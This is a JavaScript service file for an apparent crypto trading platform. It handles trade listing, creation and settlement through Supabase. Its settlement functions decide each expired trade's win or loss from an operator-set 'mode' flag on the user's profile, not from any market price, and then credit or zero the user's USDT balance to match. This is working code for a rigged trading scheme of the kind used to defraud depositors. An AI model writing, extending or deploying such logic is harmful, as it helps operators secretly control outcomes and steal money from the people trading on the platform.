import { supabase } from "../lib/supabase";
import { getUserById, updateUserAsset } from "./userService";

const TRADE_SELECT_WITH_PROFILE = `
  *,
  profiles (
    full_name,
    email,
    mode
  )
`;

async function runTradeQuery(queryFactory) {
  let result = await queryFactory(TRADE_SELECT_WITH_PROFILE);
  if (result.error) {
    result = await queryFactory("*");
  }
  if (result.error) throw result.error;
  return result;
}

export async function getTrades(params = {}) {
  const { page = 1, limit = 20, status, userId, symbol } = params;
  const from = (page - 1) * limit;
  const to = from + limit - 1;
  const { data, count } = await runTradeQuery((select) => {
    let query = supabase.from("trade_history").select(select, { count: "exact" }).order("created_at", { ascending: false }).range(from, to);
    if (status) query = query.eq("status", status);
    if (userId) query = query.eq("user_id", userId);
    if (symbol) query = query.ilike("symbol", `%${symbol}%`);
    return query;
  });
  return { items: data || [], total: count || 0 };
}

export async function getTradeById(id) {
  const { data } = await runTradeQuery((select) => supabase.from("trade_history").select(select).eq("id", id).single());
  return data;
}

export async function createTrade(tradePayload) {
  const { data, error } = await supabase.from("trade_history").insert([{ ...tradePayload, status: tradePayload.status || "open" }]).select().single();
  if (error) throw error;
  return data;
}

/* ============================================================
   AUTO-CALCULATE SETTLEMENT (LOOKS AT 'mode' COLUMN)
============================================================ */
export async function settleExpiredTrades() {
  const { data: openTrades, error } = await supabase
    .from("trade_history")
    .select(TRADE_SELECT_WITH_PROFILE)
    .eq("status", "open")
    .lt("expires_at", new Date().toISOString());

  if (error) throw error;

  for (const trade of openTrades) {
    let forcedOutcome = null;
    const userMode = trade.profiles?.mode || 'neutral';

    if (userMode === 'win') forcedOutcome = 'win';
    else if (userMode === 'lose') forcedOutcome = 'lose';

    if (forcedOutcome) {
      await adminForceSettleTrade(trade.id, forcedOutcome);
    }
  }
}

/* ============================================================
   ADMIN FORCE WIN / LOSE LOGIC
============================================================ */
export async function adminForceSettleTrade(tradeId, outcome) {
  const trade = await getTradeById(tradeId);
  if (!trade) throw new Error("Trade not found.");
  if (trade.status === "closed") throw new Error("Trade is already closed.");

  let profitAmount = 0;
  let userBalanceUpdate = 0;
  const payoutMultiplier = 1.8;

  if (outcome === 'win') {
    profitAmount = (trade.amount * payoutMultiplier) - trade.amount;
    userBalanceUpdate = trade.amount + profitAmount;
  } else if (outcome === 'lose') {
    profitAmount = -trade.amount;
    userBalanceUpdate = 0;
  } else {
    throw new Error("Invalid outcome type.");
  }

  await updateUserAsset(trade.user_id, 'USDT', userBalanceUpdate, `admin_${outcome}`, `Auto-${outcome.toUpperCase()} via Admin Mode`);

  const { data, error } = await supabase
    .from("trade_history")
    .update({ status: "closed", outcome: outcome, profit_amount: profitAmount, closed_at: new Date().toISOString() })
    .eq("id", tradeId)
    .select()
    .single();

  if (error) throw error;
  return data;
}
